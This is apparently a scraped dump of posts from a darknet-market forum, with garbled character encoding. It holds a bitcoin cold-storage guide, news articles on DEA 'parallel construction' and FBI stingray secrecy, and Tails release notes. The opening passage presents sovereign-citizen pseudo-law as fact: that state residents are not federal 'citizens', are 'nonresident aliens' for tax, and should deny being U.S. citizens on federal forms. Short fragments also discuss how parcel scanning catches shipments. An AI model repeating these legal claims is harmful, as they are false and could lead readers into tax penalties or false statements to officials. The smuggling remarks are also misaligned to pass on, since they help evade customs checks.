organized and exercise governmental functions under act of congress."" While the term 'territory' is often loosely used, and has even been construed to include municipal subdivisions of a territory, and 'territories of the' United States is sometimes used to refer to the entire domain over which the United States exercises dominion, the word 'territory,' when used to designate a political organization, has a distinctive, fixed, and legal meaning under the political institutions of the United States, and the term 'territory' or 'territories' does not necessarily include only a portion or the portions thereof which are organized and exercise government functions under acts of congress.  The term 'territories' has been defined to be political subdivisions of the outlying dominion of the United States, and in this sense the term 'territory' is not a description of a definite area of land but of a political unit governing and being governed as such.  The question whether a particular subdivision or entity is a territory is not determined by the particular form of government with which it is, more or less temporarily, invested. âTerritories' or 'territory' as including 'state' or 'states.""  While the term 'territories of the' United States may, under certain circumstances, include the states of the Union, as used in the federal Constitution and in ordinary acts of congress ""territory"" does not include a foreign state. As used in this title, the term 'territories' generally refers to the political subdivisions created by congress, and not within the boundaries of any of the several states. [86 C.J.S. (Corpus, Juris, Secundum, Legal Encyclopedia), Territories] Notice that the above legal encyclopedia definition of âterritoryâ refers to states of the Union as âforeign statesâ!  A âforeign stateâ is a state that is not subject to the legislative jurisdiction or laws of the state in question, which in this case is the federal government.  The Supreme Court also agreed with the conclusions within this section so far, in the cite next.  Notice how they use the terms âcitizenshipâ and ânationalityâ or ânationalâ interchangeably, because as you will learn later in section â4.11.13, they are equivalent: âThe term 'dual nationality' needs exact appreciation. It refers to the fact that two States make equal claim to the allegiance of an individual at the same time. Thus, one State may claim his allegiance because of his birth within its territory, and the other because at the time of his birth in foreign territory his parents were its nationals. The laws of the United States purport to clothe persons with American citizenship by virtue of both principles.'  ""And after referring to the Fourteenth Amendment, U.S.C.A.Const., and the Act of February 10, 1855, R.S. 1993, 8 U.S.C.A. 6, the instructions continued: [307 U.S. 325, 345]   'It thus becomes important to note how far these differing claims of American nationality are fairly operative with respect to persons living abroad [or in states of the Union, which are ALSO foreign with respect to federal jurisdiction], whether they were born abroad or were born in the United States of alien parents and taken during minority to reside in the territory of States to which the parents owed allegiance. It is logical that, while the child remains or resides in territory of the foreign State [a state of the Union, in this case] claiming him as a national, the United States should respect its claim to allegiance. The important point to observe is that the doctrine of dual allegiance ceases, in American contemplation, to be fully applicable after the child has reached adult years. Thereafter two States may in fact claim him as a national. Those claims are not, however, regarded as of equal merit, because one of the States may then justly assert that his relationship to itself as a national is, by reason of circumstances that have arisen, inconsistent with, and reasonably superior to, any claim of allegiance asserted by any other State. Ordinarily the State in which the individual retains his residence after attaining his majority has the superior claim. The statutory law of the United States affords some guidance but not all that could be desired, because it fails to announce the circumstances when the child who resides abroad within the territory of a State reasonably claiming his allegiance forfeits completely the right to perfect his inchoate right to retain American citizenship."" [Perkins v. Elg, 307 U.S. 325; 49 S.Ct. 884, 83 L.Ed 1320 (1939)] So when a person is domiciled outside the exclusive legislative jurisdiction or âgeneral sovereigntyâ of a political body and does not participate directly in its political functions, then they are ânationalsâ but not âcitizensâ of that political body.  This is the condition of people born in and domiciled within states of the Union in regards to their federal citizenship: 1.   State citizens maintain a domicile that is outside the territorial and exclusive legislative jurisdiction of the federal government.  They are not subject to the police powers of the federal government.  2.   State citizens do not participate directly in the political functions of the federal government.   2.1.  They are not allowed to serve as jurists in federal court, because they donât reside in a federal area within their state.  They can only serve as jurists in state courts.  Federal district courts routinely violate this limitation by not ensuring that the people who serve on federal courts come from federal areas.  If they observed the law on this matter, they wouldnât have anyone left to serve on federal petit or grand juries!  Therefore, they illegally use state DMV records to locate jurists and obfuscate the jury summons forms by asking if people are âU.S. citizensâ without ever defining what it means! 2.2.  They do not participate directly in federal elections.  There are no separate federal elections and separate voting days and voting precincts for federal elections.  State citizens only participate in state elections, and elect representatives who go to Washington to ârepresentâ their interests indirectly.  A prominent legal publisher, West Publishing, agrees with the findings in this section.  Here is what they say in their publication entitled Conflicts In A Nutshell, Second Edition: In the United States, âdomicileâ and âresidenceâ are the two major competitors for judicial attention, and the words are almost invariably used to describe the relationship that the person has to the state rather than the nation.  We use âcitizenshipâ to describe the national relationship, and we generally eschew ânationalityâ (heard more frequently among European nations) as a descriptive term. [Conflicts In A Nutshell, Second Edition, David D. Siegel, West Publishing, 1994, ISBN 0-314-02952, p. 15] A person who is a ""national"" with respect to a political jurisdiction and who does not maintain a domicile within the territorial jurisdiction of the political body is treated as a ""nonresident alien"" within federal law.  He is a ""nonresident"" because he is not ""resident"" within the territorial limits.  He is an alien, because he is ""alien"" to that jurisdiction and not directly associated with it.     26 U.S.C. 7701(b)(1)(B) Definitions An individual is a nonresident alien if such individual is  neither a citizen of the United States nor a resident of the  United States (within the meaning of subparagraph (A)). At the same time, a ""national"" and a ""nonresident alien""  who is NOT an ""individual"" is not an ""alien"" under federal law, because a ""nonresident alien"" is defined as a person who is neither a ""citizen nor a resident"", and that is exactly what a ""national but not citizen"" is.  Further confirmation of this conclusion is found in the definition of ""resident"" in 26 U.S.C. Â§7701(b)(1)(A), which defines a ""resident"" as an ""alien"".  Since the definition of ""nonresident alien"" above excludes ""residents"", then it also excludes ""aliens"". A picture is worth a thousand words.  Weâll now summarize the results of the preceding analysis to make it crystal clear for visually-minded readers: Table  4 10:  Citizenship summary Citizenship    Defined in    Domicile in the District of Columbia?    Subject to legislative jurisdiction/police powers?    Subject to âpolitical jurisdictionâ?    A ânonresdient alienâ?  âcitizenâ  8 U.S.C.

NOTES: 1.   âUnited Statesâ is defined as federal territory within 26 U.S.C. Â§Â§7701(a)(9) and (a)(10), 7701(a)(39), and 7408(d), and 4 U.S.C. Â§110(d).  It does not include any portion of a Constitutional state of the Union.  2.   The âDistrict of Columbiaâ is defined as a federal corporation but not a physical place, a âbody politicâ, or a de jure âgovernmentâ within the District of Columbia Act of 1871, 16 Stat. 419, 426, Sec. 34.    See:  Corporatization and Privatization of the Government, Form #05.024; http://sedm.org/Forms/FormIndex.htm. 3.   ânationalsâ of the United States of America who are domiciled outside of federal jurisdiction, either in a state of the Union or a foreign country, are ânationalsâ but not âcitizensâ under federal law.  They also qualify as ânonresident aliensâ under 26 U.S.C. Â§7701(b)(1)(B).  See sections 4.11.2 earlier for details. 4.   Temporary domicile in the middle column on the right must meet the requirements of the âPresence testâ documented in IRS publications. 5.   âFEDERAL ZONEâ=District of Columbia and territories of the United States in the above table 6.   The term âindividualâ as used on the IRS form 1040 means an âalienâ engaged in a âtrade or businessâ.  All âtaxpayersâ are âaliensâ engaged in a âtrade or businessâ.  This is confirmed by 26 C.F.R. Â§1.1441-1(c)(3), 26 C.F.R. Â§1.1-1(a)(2)(ii), and 5 U.S.C. Â§552a(a)(2).  Statutory âU.S. citizensâ as defined in 8 U.S.C. Â§1401 are not âindividualsâ unless temporarily abroad pursuant to 26 U.S.C. Â§911 and subject to an income tax treaty with a foreign country.  In that capacity, statutory âU.S. citizensâ  interface to the I.R.C. as âaliensâ rather than âU.S. citizensâ through the tax treaty. When a federal officer asks you if you are a âcitizenâ, consider the context!  The only basis for him asking this is federal law, because he isnât bound by state law.  If you tell him you are a âcitizenâ or a âU.S. citizenâ, then indirectly, you are admitting that you are subject to federal law, because thatâs what it means to be a âcitizenâ under federal law!  Watch out!  Therefore, as people born in and living within a state of the union on land that is not owned by the federal government, we need to be very careful how we describe ourselves on government forms.  Below is what we should say in each of the various contexts to avoid misleading those asking the questions on the forms.  In this context, letâs assume you were born in California and live there.  This guidance also applies to questions that officers of the government might ask you in each of the two contexts as well: Table  4-11:  Describing your citizenship and status on government forms         Context #    Question on form    State officer or form    Federal officer or form  1    Are you a âcitizenâ?    Yes.  Of California.   No. Not under federal law. 2   Are you a ânationalâ?   Yes.  Of California.   Yes.  Iâm a ânational of the United States of Americaâ under 8 U.S.C. Â§1101(a)(21) but not under 8 U.S.C. Â§1101(a)(22)  3   Are you a âU.S. citizenâ   No.  Iâm a California âcitizenâ or simply a ânationalâ   No.  Iâm a California citizen or simply a ânationalâ.  I am not a federal âcitizenâ because I donât reside on federal property. 4   Are you subject to the political jurisdiction of the United States?   Yes.  Iâm a state voter who influences federal elections indirectly by the representatives I elect.   Yes.  Iâm a state voter who influences federal elections indirectly by the representatives I elect. 5   Are you subject to the legislative jurisdiction of the United States?   No.  I am only subject to the legislative jurisdiction of California but not the âStateâ of California.  The âState ofâ California is a branch of the federal government that only has jurisdiction in federal areas within the state.   No.  I am only subject to the laws and police powers of California, and not the federal government, because I donât live on federal territory subject to âitsâ jurisdiction. 6   Are you a âcitizen of the United Statesâ under the Fourteenth Amendment?   Yes, but under federal law, I'm a ""national"".  Being a ""citizen"" under state law doesnât make me subject to federal legislative jurisdiction and police powers.  That status qualifies me to vote in any state election, but doesnât make me subject to federal law.   Yes, but under federal law, I'm a ""national"".  Being a ""citizen"" under state law doesnât make me subject to federal legislative jurisdiction and police powers.  That status qualifies me to vote in any state election, but doesnât make me subject to federal law. In summary: 1.   A ânationalâ is defined in 8 U.S.C. Â§1101(a)(21)  as a person who has allegiance to a âstateâ.  The existence of that allegiance provides legal evidence that a person has politically associated themselves with a âstateâ in order to procure its protection.  In return for said allegiance, the ânationalâ is entitled to the protection of the state.  Minor v. Happersett, 88 U.S. 162 (1874)  2.   The only thing you need in order to obtain a USA passport is âallegianceâ.  22 U.S.C. Â§212.  If the federal government is willing to issue you a passport, then they regard you as a ânationalâ, because the only type of citizenship that carries with it exclusively allegiance is that of a ânationalâ.  8 U.S.C. Â§1101(a)(21).  See: http://famguardian.org/Subjects/Taxes/Citizenship/ApplyingForAPassport.htm 3.   In the constitution, ânationalsâ are called âcitizensâ.   4.   A âcitizenâ in the Constitution does not imply a legal domicile on the territory of the âstateâ to whom we claim allegiance, but under federal statutory law, both âcitizensâ and âresidentsâ are persons who have a legal domicile on the territory of the state to which he claims allegiance.  5.   In federal statutory law, all âcitizensâ are also ânationalsâ but not all nationals are âcitizensâ.  For proof, see:  5.1.  8 U.S.C. Â§1401 defines a âcitizen and national of the United Statesâ. 5.2.  8 U.S.C. Â§1452  defines a ânon-citizen nationalâ. 6.   Since being a ânationalâ is a prerequisite to being a âcitizenâ, then âcitizensâ within a country are a subset of those who are ânationalsâ.  7.   âsubject to the jurisdictionâ is found in Section 1 of the Fourteenth Amendment of the Constitution.  The Constitution is a political document and the phrase âsubject to the jurisdictionâ means all of the following:  7.1.  Being a member of a political group.  Minor v. Happersett, 88 U.S. 162 (1874) âThere cannot be a nation without a people. The very idea of a political community, such as a nation is, implies an [88 U.S. 162, 166]  association of persons for the promotion of their general welfare. Each one of the persons associated becomes a member of the nation formed by the association. He owes it allegiance and is entitled to its protection. Allegiance and protection are, in this connection, reciprocal obligations. The one is a compensation for the other; allegiance for protection and protection for allegiance.  âFor convenience it has been found necessary to give a name to this membership. The object is to designate by a title the person and the relation he bears to the nation. For this purpose the words 'subject,' 'inhabitant,' and 'citizen' have been used, and the choice between them is sometimes made to depend upon the form of the government. Citizen is now more commonly employed, however, and as it has been considered better suited to the description of one living under a republican government, it was adopted by nearly all of the States upon their separation from Great Britain, and was afterwards adopted in the Articles of Confederation and in the Constitution of the United States. When used in this sense it is understood as conveying the idea of membership of a nation, and nothing more.â   âTo determine, then, who were citizens of the United States before the adoption of the amendment it is necessary to ascertain what persons originally associated themselves together to form the nation, and what were afterwards admitted to membership.  [. . .] âWhoever, then, was one of the people of either of these States when the Constitution of the United States was adopted, became ipso facto a citizen-a member of the nation created by its adoption. He was one of the persons associating together to form the nation, and was, consequently, one of its original citizens. As to this there has never been a doubt. Disputes have arisen as to whether or not certain persons or certain classes of persons were part of the people at the time, but never as to their citizenship if they were. â  [Minor v. Happersett, 88 U.S. 162 (1874)] 7.2.  Being subject to the political jurisdiction but not legislative jurisdiction of the state which we are a member of.  U.S. v. Wong Kim Ark, 169 U.S. 649 (1898) âThis section contemplates two sources of citizenship, and two sources only,-birth and naturalization. The persons declared to be citizens are 'all persons born or naturalized in the United States, and subject to the jurisdiction thereof.' The evident meaning of these last words is, not merely subject in some respect or degree to the jurisdiction of the United States, but completely subject to their [plural, not singular, meaning states of the Union] political jurisdiction, and owing them [the state of the Union] direct and immediate allegiance. And the words relate to the time of birth in the one case, as they do [169 U.S. 649, 725]  to the time of naturalization in the other. Persons not thus subject to the jurisdiction of the United States at the time of birth cannot become so afterwards, except by being naturalized, either individually, as by proceedings under the naturalization acts, or collectively, as by the force of a treaty by which foreign territory is acquired.â  [U.S. v. Wong Kim Ark, 169 U.S. 649, 18 S.Ct. 456, 42 L.Ed. 890 (1898)] 7.3.  Being able to participate in the political affairs of the state by being able to elect its members as a voter or direct its activities as a jurist.   8.   âsubject to its jurisdictionâ is found in federal statutes and regulations and it means all of the following:  8.1.  Having a legal domicile within the exclusive jurisdiction of a âstateâ.  Within federal law, this âstateâ means the âUnited Statesâ government and includes no part of any state of the Union. 8.2.  Being subject to the legislative but not political jurisdiction of a âstateâ. 9.   Political jurisdiction and political rights are the tools we use to directly run and influence the government as voters and jurists.  10.   Legislative jurisdiction, on the other hand,  is how the government controls us using the laws it passes.  Now that we understand the distinctions between âcitizensâ and ânationalsâ within federal law, we are ready to tackle the citizenship issue head on.  ",""

"The Hub Forums","axa","951.0","2014-02-20T04:36:51","Questions about Offline wallets and withdrawl ","General Discussion/Security","  Bitcoin cold storage means keeping your wallet's private keys on an offline computer. There is no more secure way to store your bitcoin, and bitcoin cold storage absolutely protects your bitcoin from loss, theft or seizure.   Online wallets like blockchain.info are convenient but should be considered your bitcoin 'checking account' and used for only a few bitcoin, because online wallets can be hacked (remember Instawallet?) For your bitcoin 'savings account' you need maximum security and that means using a bitcoin client on your home computer, one that supports cold storage.   Which bitcoin wallets offer cold storage?  Only the Armory and Electrum bitcoin wallets allow you to split your wallet into an offline 'cold storage' wallet which contains your private keys and an online 'watching only' wallet that only contains your public keys. Any hacker who is able to access your online wallet cannot steal your bitcoin, which are protected by your private keys in the offline wallet on a separate computer that never connects to the outside world.  The online 'watching only' wallet can give out receiving addresses and generate transactions. When you spend bitcoin from your online wallet the wallet generates an unsigned transaction file that you take to your offline computer on a USB key. You import the unsigned transaction into your offline wallet and sign with your private key, then take the signed transaction back to your online wallet and broadcast the signed transaction. Because your offline wallet never connects to the internet your bitcoins are as secure as possible.  Armory and Electrum are both deterministic wallets and only need to be backed up once. In a deterministic wallet all the bitcoin addresses your wallet will ever generate are derived from a long series of numbers or letters called a seed. As long as you have your seed backed up, you can recreate the wallet at will.   Hardware requirements for bitcoin cold storage  Armory's online watching only wallet now runs on either 32 bit or 64 bit computer with 1-2 GB RAM. You can download Armory 0.90-beta at  (https://bitcoinarmory.com/download/)  The computer you use for your offline wallet does not need to be 64 bit. Any computer made in the last ten years should work for your Armory offline wallet. However, for maximum security your offline wallet should be used on a computer with full disk encryption to protect your private keys in case the computer is stolen.  Electrum is a lightweight bitcoin wallet and will run on any computer with no special requirements for memory.   If the operating system on your offline computer does not offer full disk encryption consider replacing the OS with a free Linux distribution which does.  Using Linux for your offline wallet laptop also protects you from the risk of transmitting Windows malware through the USB drive.

Suppose I have bitcoin-qt, and I have some coins which I want to store cold for a long time. Are you saying that:1) the only client in which to store them is electrum? And it must be on a different computer?2) in order for the second client (the cold storage one) to be able to store the coins I have to create an address on it (which never sees the light of internet); yet from the first client, I must ""send"" the coins to that other address, but so that the blockchain records the transaction, I must do it while connected, and the blockchain will show the coins moving from one address (my bitcoin-qt client) to another address (my cold storage client, be it electrum or whatever)?Is that how it works?I don't suppose I can just put my wallet.dat and the other file, what's it called?, the one that stores the addresses. I say I can just transfer those two files to another computer with another bitcoin client, and just have those addresses be now part of a cold storage system, leaving my old, connected client, with just new addresses and an empty wallet? Can this be done?goblin"

"The Hub Forums","r0bertden1ro","6084.0","2014-12-16T03:24:48","U.S. directs agents to cover up program used to investigate Americans (reuters)","General Discussion/Legal","Source: http://www.reuters.com/article/2013/08/05/us-dea-sod-idUSBRE97409R20130805  ","(Reuters) - A secretive U.S. Drug Enforcement Administration unit is funneling information from intelligence intercepts, wiretaps, informants and a massive database of telephone records to authorities across the nation to help them launch criminal investigations of Americans.Although these cases rarely involve national security issues, documents reviewed by Reuters show that law enforcement agents have been directed to conceal how such investigations truly begin - not only from defense lawyers but also sometimes from prosecutors and judges.The undated documents show that federal agents are trained to ""recreate"" the investigative trail to effectively cover up where the information originated, a practice that some experts say violates a defendant's Constitutional right to a fair trial. If defendants don't know how an investigation began, they cannot know to ask to review potential sources of exculpatory evidence - information that could reveal entrapment, mistakes or biased witnesses.""I have never heard of anything like this at all,"" said Nancy Gertner, a Harvard Law School professor who served as a federal judge from 1994 to 2011. Gertner and other legal experts said the program sounds more troubling than recent disclosures that the National Security Agency has been collecting domestic phone records. The NSA effort is geared toward stopping terrorists; the DEA program targets common criminals, primarily drug dealers.""It is one thing to create special rules for national security,"" Gertner said. ""Ordinary crime is entirely different. It sounds like they are phonying up investigations.""THE SPECIAL OPERATIONS DIVISIONThe unit of the DEA that distributes the information is called the Special Operations Division, or SOD. Two dozen partner agencies comprise the unit, including the FBI, CIA, NSA, Internal Revenue Service and the Department of Homeland Security. It was created in 1994 to combat Latin American drug cartels and has grown from several dozen employees to several hundred.Today, much of the SOD's work is classified, and officials asked that its precise location in Virginia not be revealed. The documents reviewed by Reuters are marked ""Law Enforcement Sensitive,"" a government categorization that is meant to keep them confidential.""Remember that the utilization of SOD cannot be revealed or discussed in any investigative function,"" a document presented to agents reads. The document specifically directs agents to omit the SOD's involvement from investigative reports, affidavits, discussions with prosecutors and courtroom testimony. Agents are instructed to then use ""normal investigative techniques to recreate the information provided by SOD.""A spokesman with the Department of Justice, which oversees the DEA, declined to comment.But two senior DEA officials defended the program, and said trying to ""recreate"" an investigative trail is not only legal but a technique that is used almost daily.A former federal agent in the northeastern United States who received such tips from SOD described the process. ""You'd be told only, Ã¢â¬ËBe at a certain truck stop at a certain time and look for a certain vehicle.' And so we'd alert the state police to find an excuse to stop that vehicle, and then have a drug dog search it,"" the agent said.""PARALLEL CONSTRUCTION""After an arrest was made, agents then pretended that their investigation began with the traffic stop, not with the SOD tip, the former agent said. The training document reviewed by Reuters refers to this process as ""parallel construction.""The two senior DEA officials, who spoke on behalf of the agency but only on condition of anonymity, said the process is kept secret to protect sources and investigative methods. ""Parallel construction is a law enforcement technique we use every day,"" one official said. ""It's decades old, a bedrock concept.""A dozen current or former federal agents interviewed by Reuters confirmed they had used parallel construction during their careers. Most defended the practice; some said they understood why those outside law enforcement might be concerned.""It's just like laundering money - you work it backwards to make it clean,"" said Finn Selander, a DEA agent from 1991 to 2008 and now a member of a group called Law Enforcement Against Prohibition, which advocates legalizing and regulating narcotics.Some defense lawyers and former prosecutors said that using ""parallel construction"" may be legal to establish probable cause for an arrest. But they said employing the practice as a means of disguising how an investigation began may violate pretrial discovery rules by burying evidence that could prove useful to criminal defendants.A QUESTION OF CONSTITUTIONALITY""That's outrageous,"" said Tampa attorney James Felman, a vice chairman of the criminal justice section of the American Bar Association. ""It strikes me as indefensible.""Lawrence Lustberg, a New Jersey defense lawyer, said any systematic government effort to conceal the circumstances under which cases begin ""would not only be alarming but pretty blatantly unconstitutional.""Lustberg and others said the government's use of the SOD program skirts established court procedures by which judges privately examine sensitive information, such as an informant's identity or classified evidence, to determine whether the information is relevant to the defense.""You can't game the system,"" said former federal prosecutor Henry E. Hockeimer Jr. ""You can't create this subterfuge. These are drug crimes, not national security cases. If you don't draw the line here, where do you draw it?""Some lawyers say there can be legitimate reasons for not revealing sources. Robert Spelke, a former prosecutor who spent seven years as a senior DEA lawyer, said some sources are classified. But he also said there are few reasons why unclassified evidence should be concealed at trial.""It's a balancing act, and they've doing it this way for years,"" Spelke said. ""Do I think it's a good way to do it? No, because now that I'm a defense lawyer, I see how difficult it is to challenge.""CONCEALING A TIPOne current federal prosecutor learned how agents were using SOD tips after a drug agent misled him, the prosecutor told Reuters. In a Florida drug case he was handling, the prosecutor said, a DEA agent told him the investigation of a U.S. citizen began with a tip from an informant. When the prosecutor pressed for more information, he said, a DEA supervisor intervened and revealed that the tip had actually come through the SOD and from an NSA intercept.""I was pissed,"" the prosecutor said. ""Lying about where the information came from is a bad start if you're trying to comply with the law because it can lead to all kinds of problems with discovery and candor to the court."" The prosecutor never filed charges in the case because he lost confidence in the investigation, he said.A senior DEA official said he was not aware of the case but said the agent should not have misled the prosecutor. How often such misdirection occurs is unknown, even to the government; the DEA official said the agency does not track what happens with tips after the SOD sends them to agents in the field.The SOD's role providing information to agents isn't itself a secret. It is briefly mentioned by the DEA in budget documents, albeit without any reference to how that information is used or represented when cases go to court.The DEA has long publicly touted the SOD's role in multi-jurisdictional and international investigations, connecting agents in separate cities who may be unwittingly investigating the same target and making sure undercover agents don't accidentally try to arrest each other.SOD'S BIG SUCCESSESThe unit also played a major role in a 2008 DEA sting in Thailand against Russian arms dealer Viktor Bout; he was sentenced in 2011 to 25 years in prison on charges of conspiring to sell weapons to the Colombian rebel group FARC. The SOD also recently coordinated Project Synergy, a crackdown against manufacturers, wholesalers and retailers of synthetic designer drugs that spanned 35 states and resulted in 227 arrests.Since its inception, the SOD's mandate has expanded to include narco-terrorism, organized crime and gangs. A DEA spokesman declined to comment on the unit's annual budget. A recent LinkedIn posting on the personal page of a senior SOD official estimated it to be $125 million.Today, the SOD offers at least three services to federal, state and local law enforcement agents: coordinating international investigations such as the Bout case; distributing tips from overseas NSA intercepts, informants, foreign law enforcement partners and domestic wiretaps; and circulating tips from a massive database known as DICE.The DICE database contains about 1 billion records, the senior DEA officials said. The majority of the records consist of phone log and Internet data gathered legally by the DEA through subpoenas, arrests and search warrants nationwide. Records are kept for about a year and then purged, the DEA officials said.About 10,000 federal, state and local law enforcement agents have access to the DICE database, records show. They can query it to try to link otherwise disparate clues. Recently, one of the DEA officials said, DICE linked a man who tried to smuggle $100,000 over the U.S. southwest border to a major drug case on the East Coast.""We use it to connect the dots,"" the official said.""AN AMAZING TOOL""Wiretap tips forwarded by the SOD usually come from foreign governments, U.S. intelligence agencies or court-authorized domestic phone recordings. Because warrantless eavesdropping on Americans is illegal, tips from intelligence agencies are generally not forwarded to the SOD until a caller's citizenship can be verified, according to one senior law enforcement official and one former U.S. military intelligence analyst.""They do a pretty good job of screening, but it can be a struggle to know for sure whether the person on a wiretap is American,"" the senior law enforcement official said.Tips from domestic wiretaps typically occur when agents use information gleaned from a court-ordered wiretap in one case to start a second investigation.As a practical matter, law enforcement agents said they usually don't worry that SOD's involvement will be exposed in court. That's because most drug-trafficking defendants plead guilty before trial and therefore never request to see the evidence against them. If cases did go to trial, current and former agents said, charges were sometimes dropped to avoid the risk of exposing SOD involvement.Current and former federal agents said SOD tips aren't always helpful - one estimated their accuracy at 60 percent. But current and former agents said tips have enabled them to catch drug smugglers who might have gotten away.""It was an amazing tool,"" said one recently retired federal agent. ""Our big fear was that it wouldn't stay secret.""DEA officials said that the SOD process has been reviewed internally. They declined to provide Reuters with a copy of their most recent review.(Edited by Blake Morrison)"

Scanner staff know (for example) what a toaster in a box tends to look like and if you're showing as much more dense than usual then prepare for doom.

This is very rare for smaller items because it's not generally worth the time and money investment.  - If a big package is seized, you suffer 100% loss.

All users must upgrade as soon as possible: this release fixes numerous security issues.  Changes  Notable user-visible changes include:      Security fixes         Upgrade the web browser to 24.4.0esr-0+tails1~bpo60+1 (Firefox         24.4.0esr + Iceweasel patches + Torbrowser patches).     Major new features         Spoof the network interfaces' MAC address         by default. It can be disabled in Tails Greeter.         Rework the way to         configure how Tor connects to the network         by using bridges, proxies and restrictive firewalls. This option         can be set from Tails Greeter, and replaces the old         experimental ""bridge mode"" feature.     Bugfixes         Additional software: do not crash when persistence is disabled.         Upgrade Pidgin to 2.10.9, that fixes some regressions introduced in the 2.10.8 security update.         Wait for Tor to have fully bootstrapped, plus a bit more time, before checking for upgrades and unfixed known security issues.         Disable the Intel Management Engine Interface driver. We don't need it in Tails, it might be dangerous, and it causes bugs on various hardware such as systems that reboot when asked to shut down.         Add a launcher for the Tails documentation. This makes it available in Windows Camouflage mode.         Remove the obsolete wikileaks.de account from Pidgin.     Minor improvements         Upgrade Tor to 0.2.4.21-1~d60.squeeze+1.         Upgrade obfsproxy to 0.2.6-2~~squeeze+1.         Upgrade I2P to 0.9.11-1deb6u1.         Install 64-bit kernel instead of the 686-pae one. This is a necessary first step towards UEFI boot support.         Install Monkeysign (in a not-so-functional shape yet).         Disable the autologin text consoles. This was one of the blockers before a screen saver can be installed in a meaningful way.         Don't localize the text consoles anymore: it is broken on Wheezy, the intended users can as well use loadkeys, and we now do not have to trust setupcon to be safe for being run as root by the desktop user.         Make it possible to manually start IBus.         Reintroduce the possibility to switch identities in the Tor Browser, using a filtering proxy in front of the Tor ControlPort to avoid giving full control over Tor to the desktop user.         Incremental upgrades improvements:             Drop the Tails Upgrader launcher, to limit users' confusion.             Lock down sudo credentials a bit.             Hide debugging information.             Include ~/.xsession-errors in WhisperBack bug reports. This captures the Tails Upgrader errors and debugging information.             Report more precisely why an incremental upgrade cannot be done.             Various user interface and phrasing improvements.         Don't install the Cookie Monster browser extension.         Add a browser bookmark pointing to Tor's Stack Exchange.         Remove the preconfigured #tor channel from the Pidgin: apparently, too many Tails users go ask Tails questions there, without making it clear that they are running Tails, hence creating a user-support nightmare.         Use (most of) Tor Browser's mozconfig.         Rebase the browser on top of iceweasel 24.3.0esr-1, to get the certificate authorities added by Debian back.         Give access to the relevant documentation pages from Tails Greeter.         Hide Tails Greeter's password mismatch warning when entry is changed.         Persistent Volume Assistant:             Take into account our installer is now called Tails Installer.             Optimize window height.             Display device paths in a more user-friendly way.

"The Hub Forums","hackerjon","9071.0","2015-05-17T12:53:21","FBI Lets Cops Discuss Stingray","General Discussion/Legal","The FBI has released a statement regarding the use of stingrays, which apparently claims the opposite of what its nondisclosure agreement (NDA) with local law enforcement actually says. According to The Washington Post, which quoted from but did not publish the statement on Thursday, the FBI doesnât actually prevent local law enforcement from disclosing stingray use.  Ars received a copy of the statement from the FBI early Friday morning and is publishing it in full for the first time. (here's a link to a scanned copy of the email: https://www.documentcloud.org/documents/2082240-urgent-copy-of-stingray-statement.html)  Among other things, it says:  The NDA should not be construed to prevent a law enforcement officer from disclosing to the court or a prosecutor the fact that this technology was used in a particular case. Defendants have a legal right to challenge the use of electronic surveillance devices, and not disclosing their use could inappropriately and adversely affect a defendantâs right to challenge the use of the equipment. Not only can stingrays, or cell-site simulators, be used to determine location by spoofing a cell tower, but they can also be used to intercept calls and text messages. Once deployed, the devices intercept data from a target phone as well as information from other phones within the vicinity. For years, federal and local law enforcement have tried to keep their existence a secret while simultaneously upgrading their capabilities. Over the last year, as the devices have come under increased scrutiny, new information about the secretive devices has come to light.  The statement comes just days after Washington stateâs governor signed into law a new statute that not only requires that cops get a warrant before using a stingray, but that they fully describe its capabilities to judges in that warrant application and agree to provisions to minimize and destroy data captured from non-target phones.  Within the last year, there have been examples of prosecutors who have dropped casesâeven after receiving guilty pleasârather than offering disclosures on stingray use. The statement says that this provision has never been invoked by the FBI.  âShall notâ¦ use or provide any informationâ  In April 2015, the New York Civil Liberties Union won a lawsuit filed against the Erie County Sheriffâs Office (ECSO) in Northwestern New York, where that agency was compelled to produce its NDA with the FBI, the first time one had been released in fully unredacted form. Similar agreements are believed to exist between the FBI and many other law enforcement agencies nationwide.  The newly revealed sections state:  7) The Erie County Sheriff's Office shall not, in any civil or criminal proceeding, use or provide any information concerning the Harris Corporation wireless collection equipment/technology, its associated software, operating manuals, and any related documentation (including its technical/engineering description(s) and capabilities) beyond the evidentiary results obtained through the use of the equipment/technology including, but not limited to, during pre-trial matters, in search warrants, and related affidavits, in discovery, in response to court ordered disclosure, in other affidavits, in grand jury hearings, in the State's case-in-chief, rebuttal, or on appeal, or in testimony in any phase of civil or criminal trial, without the prior written approval of the FBI.    In addition, the Erie County Sheriff's Office will, at the request of the FBI, seek dismissal of the case in lieu of using or providing, or allowing others to use or provide, any information concerning the Harris Corporation wireless collection equipment/technology, its associated software, operating manuals, and any related documentation (beyond the evidentiary results obtained through the use of the equipment/technology), if using or providing such information would potentially or actually compromise the equipment/technology. This point supposes that the agency has some control or influence over the prosecutorial process. Where such is not the case, or is limited so as to be inconsequential, it is the FBI's expectation that the law enforcement agency identify the applicable prosecuting agency, or agencies, for inclusion in this agreement.  ""The FBIâs concern is with protecting the law enforcement sensitive details regarding the tradecraft and capabilities of the device,"" Allen said in the statement provided both to the Post and to Ars. Previously, Allen declined to answer direct questions from Ars about the circumstances of stingray use. Last year, Allen sent Ars an affidavit from a top FBI official outlining the agency's position on why so little information has been publicly disclosed.  ""The FBI routinely asserts the law enforcement sensitive privilege over cell site simulator equipment because discussion of the capabilities and use of the equipment in court would allow criminal defendants, criminal enterprises, or foreign powers, should they gain access to the items, to determine the FBIâs techniques, procedures, limitations, and capabilities in this area,"" Bradley Morrison, chief of the tracking technology unit at the FBI, stated in the affidavit.  ""This knowledge could easily lead to the development and employment of countermeasures to FBI tools and investigative techniques by subjects of investigations and completely disarm law enforcementâs ability to obtain technology-based surveillance data in criminal investigations,"" Morrison said.  Earlier this month, the Department of Justice, which oversees the FBI, announced that it would be reviewing its stingray policies.  On Friday, Allen did not immediately respond to Ars' specific questions.",""

